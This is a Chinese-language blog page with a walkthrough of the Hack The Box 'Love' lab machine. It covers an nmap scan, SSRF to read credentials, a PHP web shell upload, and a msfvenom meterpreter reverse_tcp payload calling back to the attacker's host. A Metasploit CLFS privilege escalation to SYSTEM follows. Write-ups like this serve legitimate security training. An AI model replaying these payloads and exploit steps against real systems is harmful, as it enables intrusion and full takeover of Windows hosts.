@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ry0ma24.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content=".wvjmmhdglovm{zoom:50%;}">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Love">
+<meta property="og:url" content="https://ry0ma24.github.io/Hackthebox/htb/htb-love/index.html">
+<meta property="og:site_name" content="相忘于江湖">
+<meta property="og:description" content=".wvjmmhdglovm{zoom:50%;}">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-love/c00774d8d806b82c709c596937a92d14.png">
+<meta property="og:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-love/image-20250222122349377.png">
+<meta property="og:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-love/image-20250222123810029.png">
+<meta property="og:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-love/image-20250222130122775.png">
+<meta property="og:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-love/image-20250222131025885.png">
+<meta property="og:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-love/image-20250222142215068.png">
+<meta property="og:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-love/image-20250222133719719.png">
+<meta property="article:published_time" content="2025-02-22T03:36:10.000Z">
+<meta property="article:modified_time" content="2025-02-24T05:30:51.803Z">
+<meta property="article:author" content="Ry0ma24">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-love/c00774d8d806b82c709c596937a92d14.png">
+
+
+<link rel="canonical" href="https://ry0ma24.github.io/Hackthebox/htb/htb-love/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ry0ma24.github.io/Hackthebox/htb/htb-love/","path":"Hackthebox/htb/htb-love/","title":"HTB-Love"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HTB-Love | 相忘于江湖</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">相忘于江湖</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人生天地之间，若白驹之过隙，忽然而已</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap-Scan"><span class="nav-number">1.</span> <span class="nav-text">Nmap Scan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">3.</span> <span class="nav-text">权限提升</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ry0ma24"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ry0ma24</p>
+  <div class="site-description" itemprop="description">好好活动，好好学习，好好游戏，好好吃饭，好好休息，要过一个开心有趣，精神百倍的人生</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yourname" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yourname" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yourname@gmail.com" title="E-Mail → mailto:yourname@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ry0ma24.github.io/Hackthebox/htb/htb-love/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ry0ma24">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="相忘于江湖">
+      <meta itemprop="description" content="好好活动，好好学习，好好游戏，好好吃饭，好好休息，要过一个开心有趣，精神百倍的人生">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="HTB-Love | 相忘于江湖">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTB-Love
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-02-22 11:36:10" itemprop="dateCreated datePublished" datetime="2025-02-22T11:36:10+08:00">2025-02-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-24 13:30:51" itemprop="dateModified" datetime="2025-02-24T13:30:51+08:00">2025-02-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Hackthebox/" itemprop="url" rel="index"><span itemprop="name">Hackthebox</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><style>.wvjmmhdglovm{zoom:50%;}</style><img src="/Hackthebox/htb/htb-love/c00774d8d806b82c709c596937a92d14.png" class="wvjmmhdglovm">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th align="left">OS</th>
+<th align="left">Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Windows</td>
+<td align="left">Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> nmap 10.10.10.239 -sV -sC  -p- -T4 --min-rate 1000 -e tun0</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-22 11:34 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.239</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line">Not shown: 65516 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>j PHP/<span class="number">7.3</span>.<span class="number">27</span>)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-title: Voting System using PHP</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.4</span>.<span class="number">46</span> (Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>j PHP/<span class="number">7.3</span>.<span class="number">27</span></span><br><span class="line"><span class="number">135</span>/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line"><span class="number">443</span>/tcp   open  ssl/http     Apache httpd <span class="number">2.4</span>.<span class="number">46</span> (OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>j PHP/<span class="number">7.3</span>.<span class="number">27</span>)</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/<span class="number">1.1</span></span><br><span class="line">| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in</span><br><span class="line">| Not valid before: <span class="number">2021</span>-<span class="number">01</span>-<span class="number">18</span>T14:<span class="number">00</span>:<span class="number">16</span></span><br><span class="line">|_Not valid after:  <span class="number">2022</span>-<span class="number">01</span>-<span class="number">18</span>T14:<span class="number">00</span>:<span class="number">16</span></span><br><span class="line">|_http-server-header: Apache/<span class="number">2.4</span>.<span class="number">46</span> (Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>j PHP/<span class="number">7.3</span>.<span class="number">27</span></span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">|_http-title: <span class="number">400</span> Bad Request</span><br><span class="line"><span class="number">445</span>/tcp   open  microsoft-ds Windows <span class="number">10</span> Pro <span class="number">19042</span> microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line"><span class="number">3306</span>/tcp  open  mysql        MariaDB <span class="number">10.3</span>.<span class="number">24</span> or later (unauthorized)</span><br><span class="line"><span class="number">5000</span>/tcp  open  http         Apache httpd <span class="number">2.4</span>.<span class="number">46</span> (OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>j PHP/<span class="number">7.3</span>.<span class="number">27</span>)</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.4</span>.<span class="number">46</span> (Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>j PHP/<span class="number">7.3</span>.<span class="number">27</span></span><br><span class="line">|_http-title: <span class="number">403</span> Forbidden</span><br><span class="line"><span class="number">5040</span>/tcp  open  unknown</span><br><span class="line"><span class="number">5985</span>/tcp  open  http         Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/<span class="number">2.0</span></span><br><span class="line">|_http-title: Not Found</span><br><span class="line"><span class="number">5986</span>/tcp  open  ssl/http     Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/<span class="number">2.0</span></span><br><span class="line">|_http-title: Not Found</span><br><span class="line">| ssl-cert: Subject: commonName=LOVE</span><br><span class="line">| Subject Alternative Name: DNS:LOVE, DNS:Love</span><br><span class="line">| Not valid before: <span class="number">2021</span>-<span class="number">04</span>-<span class="number">11</span>T14:<span class="number">39</span>:<span class="number">19</span></span><br><span class="line">|_Not valid after:  <span class="number">2024</span>-<span class="number">04</span>-<span class="number">10</span>T14:<span class="number">39</span>:<span class="number">19</span></span><br><span class="line">|_ssl-date: <span class="number">2025</span>-<span class="number">02</span>-<span class="number">22</span>T03:<span class="number">43</span>:<span class="number">45</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">4</span>m16s from scanner time.</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/<span class="number">1.1</span></span><br><span class="line"><span class="number">7680</span>/tcp  open  pando-pub?</span><br><span class="line"><span class="number">47001</span>/tcp open  http         Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/<span class="number">2.0</span></span><br><span class="line"><span class="number">49664</span>/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line"><span class="number">49665</span>/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line"><span class="number">49666</span>/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line"><span class="number">49667</span>/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line"><span class="number">49668</span>/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line"><span class="number">49669</span>/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line"><span class="number">49670</span>/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: <span class="number">2</span>h04m17s, deviation: <span class="number">4</span>h00m02s, median: <span class="number">4</span>m15s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: <span class="number">2025</span>-<span class="number">02</span>-<span class="number">22</span>T03:<span class="number">43</span>:<span class="number">31</span></span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   <span class="number">3</span>:<span class="number">1</span>:<span class="number">1</span>: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows <span class="number">10</span> Pro <span class="number">19042</span> (Windows <span class="number">10</span> Pro <span class="number">6.3</span>)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_10::-</span><br><span class="line">|   Computer name: Love</span><br><span class="line">|   NetBIOS computer name: LOVE\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: <span class="number">2025</span>-<span class="number">02</span>-<span class="number">21</span>T19:<span class="number">43</span>:<span class="number">34</span>-<span class="number">08</span>:<span class="number">00</span></span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">282.61</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通过扫描在443 端口发现一个子域名，将<code>love.htb</code>和<code>staging.love.htb</code>添加本地域名解析到hosts文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;10.10.10.239 love.htb&#x27;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> -a /etc/hosts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;10.10.10.239 staging.love.htb&#x27;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问<code>staging.love.htb</code> 点击Demo 找到一个输入框</p>
+<img src="/Hackthebox/htb/htb-love/image-20250222122349377.png" class="" title="访问">
+
+<p>使用Python3 启用一个web服务，在输入框中输入url 然后点击<code>Scan file</code> 发现存在SSRF</p>
+<img src="/Hackthebox/htb/htb-love/image-20250222123810029.png" class="" title="SSRF">
+
+<p>依次探测开放端口，发现在5000端口可以读取到凭证</p>
+<img src="/Hackthebox/htb/htb-love/image-20250222130122775.png" class="" title="内网探测">
+
+<p>对<code>love.htb</code>和<code>staging.love.htb</code> 目录进行fuzz 发现<code>love.htb</code> 有个admin页面，使用获取到的帐号密码登录，点击Votes，上传php木马</p>
+<img src="/Hackthebox/htb/htb-love/image-20250222131025885.png" class="" title="文件上传">
+
+<p>使用蚁剑连接shell</p>
+<img src="/Hackthebox/htb/htb-love/image-20250222142215068.png" class="" title="Getshell">
+
+<img src="/Hackthebox/htb/htb-love/image-20250222133719719.png" class="" title="upload">
+
+<p>将shell从蚁剑转到msfconsole：生成后门，然后使用蚁剑上传文件并执行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成payload</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.30 LPORT=4444 -f exe &gt; shell.exe </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line"><span class="comment"># 接收反弹shell</span></span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit </span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.30:4444 </span><br><span class="line">[*] Sending stage (203846 bytes) to 10.10.10.239</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.16.30:4444 -&gt; 10.10.10.239:52670) at 2025-02-22 13:43:06 +0800</span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: LOVE\Phoebe</span><br></pre></td></tr></table></figure>
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用 <code>multi/recon/local_exploit_suggester</code>  收集信息为提权做准备</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line">[*] 10.10.10.239 - Collecting <span class="built_in">local</span> exploits <span class="keyword">for</span> x64/windows...</span><br><span class="line">[*] 10.10.10.239 - 203 exploit checks are being tried...</span><br><span class="line">[+] 10.10.10.239 - exploit/windows/local/always_install_elevated: The target is vulnerable.</span><br><span class="line">[+] 10.10.10.239 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.239 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.239 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.239 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows 10 20H2 build detected!</span><br><span class="line">[+] 10.10.10.239 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.239 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.239 - exploit/windows/local/cve_2023_28252_clfs_driver: The target appears to be vulnerable. The target is running windows version: 10.0.19042.0 <span class="built_in">which</span> has a vulnerable version of clfs.sys installed by default</span><br><span class="line">[+] 10.10.10.239 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows 10 version 20H2</span><br><span class="line">[+] 10.10.10.239 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.</span><br><span class="line">[*] Running check method <span class="keyword">for</span> exploit 48 / 48</span><br><span class="line">[*] 10.10.10.239 - Valid modules <span class="keyword">for</span> session 1:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>查看系统版本为19042，使用<code>exploit/windows/local/cve_2023_28252_clfs_driver</code> 进行权限提升</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; sysinfo </span><br><span class="line">Computer        : LOVE</span><br><span class="line">OS              : Windows 10 (10.0 Build 19042).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : en_US</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x64/windows</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/local/cve_2023_28252_clfs_driver) &gt; <span class="built_in">set</span> LHOST tun0</span><br><span class="line">LHOST =&gt; 10.10.16.30</span><br><span class="line">msf6 exploit(windows/local/cve_2023_28252_clfs_driver) &gt; <span class="built_in">set</span> session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/cve_2023_28252_clfs_driver) &gt; exploit </span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.30:4444 </span><br><span class="line">[*] Running automatic check (<span class="string">&quot;set AutoCheck false&quot;</span> to <span class="built_in">disable</span>)</span><br><span class="line">[+] The target appears to be vulnerable. The target is running windows version: 10.0.19042.0 <span class="built_in">which</span> has a vulnerable version of clfs.sys installed by default</span><br><span class="line">[*] Launching netsh to host the DLL...</span><br><span class="line">[+] Process 3976 launched.</span><br><span class="line">[*] Reflectively injecting the DLL into 3976...</span><br><span class="line">[+] Exploit finished, <span class="built_in">wait</span> <span class="keyword">for</span> (hopefully privileged) payload execution to complete.</span><br><span class="line">[*] Sending stage (203846 bytes) to 10.10.10.239</span><br><span class="line">[*] Meterpreter session 2 opened (10.10.16.30:4444 -&gt; 10.10.10.239:52672) at 2025-02-22 13:55:57 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">Flag</th>
+<th align="left">Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Flag1</td>
+<td align="left">C:\Users\Phoebe\Desktop\user.txt</td>
+</tr>
+<tr>
+<td align="left">Flag2</td>
+<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
+</tr>
+</tbody></table>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/RCE/" rel="tag"># RCE</a>
+              <a href="/tags/SSRF/" rel="tag"># SSRF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Hackthebox/htb/htb-bountyhunter/" rel="prev" title="HTB-BountyHunter">
+                  <i class="fa fa-angle-left"></i> HTB-BountyHunter
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Hackthebox/htb/htb-remote/" rel="next" title="HTB-Remote">
+                  HTB-Remote <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ry0ma24</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
